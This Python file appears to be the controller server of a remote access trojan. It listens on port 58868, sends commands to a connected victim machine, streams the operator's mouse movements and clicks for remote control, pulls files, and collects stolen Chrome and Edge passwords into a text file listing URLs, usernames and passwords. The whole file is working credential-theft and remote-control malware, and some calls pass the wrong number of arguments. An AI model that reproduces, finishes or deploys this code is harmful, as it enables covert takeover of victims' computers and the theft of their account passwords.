import socket
import argparse
from threading import Thread
import tkinter as tk
import struct
import sys
import pyautogui
import time
import pyWinhook
import pythoncom
import os
import multiprocessing

global mouseC
mouseC = ""
socketList = []
def deal_data(conn):
    while 1:
        fileinfo_size = struct.calcsize('128sl')
        buf = conn.recv(fileinfo_size)
        if buf:
            filename, filesize = struct.unpack('128sl', buf)
            fn = filename.strip(b'\00')
            fn = fn.decode()
            print ('file new name is {0}, filesize is {1}'.format(str(fn),filesize))
            recvd_size = 0
            fp = open('./' + str(fn), 'wb')
            print ('start receiving...')
            
            while not recvd_size == filesize:
                if filesize - recvd_size > 1024:
                    data = conn.recv(1024)
                    recvd_size += len(data)
                else:
                    data = conn.recv(filesize - recvd_size)
                    recvd_size = filesize
                fp.write(data)
            fp.close()
            print ('end receive...')
        break
    return True

def recv_pass(conn):
    print("======== start searching password ========")
    os.makedirs("pass_folder", exist_ok=True)
    buf = 1
    times = 0
    num_file = 0
    num_recv = 0
    while buf:
        fileinfo_size = struct.calcsize('128sl')
        if (num_file == 0):
            num_recv_packed = conn.recv(4)
            num_file = struct.unpack('!I', num_recv_packed)[0]
            print("num of file: ", num_file)
        buf = conn.recv(fileinfo_size)
        if buf:
            if times == 0:
                print("======== start receiving password ========")
                times = 1
            filename, filesize = struct.unpack('128sl', buf)
            fn = filename.strip(b'\00')
            fn = fn.decode()
            print ('file new name is {0}, filesize is {1}'.format(str(fn),filesize))

            recvd_size = 0
            fp = open('./pass_folder/' + str(fn), 'wb')
            print ('start receiving...')
            

            while not recvd_size == filesize:
                if filesize - recvd_size > 1024:
                    data = conn.recv(1024)
                    recvd_size += len(data)
                else:
                    data = conn.recv(filesize - recvd_size)
                    recvd_size = filesize
                fp.write(data)
            fp.close()
            num_recv += 1
        print ('end receive...')
        if (num_recv == num_file):
            break
    print("======== finish receiving password ========")
    return True

# Send command
def sendCmd(cmd):
    print("Sending command......")
    socketList[0].send(cmd.encode('UTF-8'))
    print("Sending successfully")

    
def sendData():
    def onMouseEvent(event):
        x_size, y_size = pyautogui.size()
        x,y = pyautogui.position()
        x_pos = str(x).rjust(4)
        y_pos = str(y).rjust(4)
        x_relative = int(x_pos) / x_size
        y_relative = int(y_pos) / y_size
        pos = "," + str(x_relative) + "," + str(y_relative)
        if event.MessageName == "mouse left down":
            mouseC = "," + "LD" + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        elif event.MessageName == "mouse left up":
            mouseC = "," + "LU" + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        elif event.MessageName == "mouse right down":
            mouseC = "," + "RD" + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        elif event.MessageName == "mouse right up":
            mouseC = "," + "RU" + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        else:
            mouseC = "," + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        return True
    if __name__ == "__main__":
        hm = pyWinhook.HookManager()
        hm.MouseAll = onMouseEvent
        hm.HookMouse()
        pythoncom.PumpMessages()


def generate():
    os.system("generateWindow.exe")

def main():
    p1 = multiprocessing.Process(target=generate)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 58868))
    s.listen(1024)
    conn, addr = s.accept()
    socketList.append(conn)
    print("There are 1 client connected")
    while True:
        print('=' * 50)
        cmd_str = input("Please input command:")
        sendCmd(cmd_str)
        if cmd_str[0] == "m" and cmd_str[1] == "o":
            p1.start()
            while True:
                sendData()
                time.sleep(0.02)
                
        if cmd_str[0] == "s" and cmd_str[1] == "e":
            deal_data(conn, addr)
        
        if cmd_str[0] == "f" and cmd_str[1] == "i":
            information_ls = conn.recv(102400).decode('utf-8').split(";")
            with open("Chrome_Edge_password.txt", 'w') as file:
                for i in range(len(information_ls)//3):
                    file.write("Url: " + information_ls[i*3] + '\n')
                    file.write("username: " + information_ls[i*3+1] + '\n')
                    file.write("password: " + information_ls[i*3+2] + '\n')
                    file.write("*"*50 + '\n')
                print("Successfully create Chrome_Edge_password.txt")
            recv_pass(conn, addr)

if __name__ == '__main__':
    main()
    
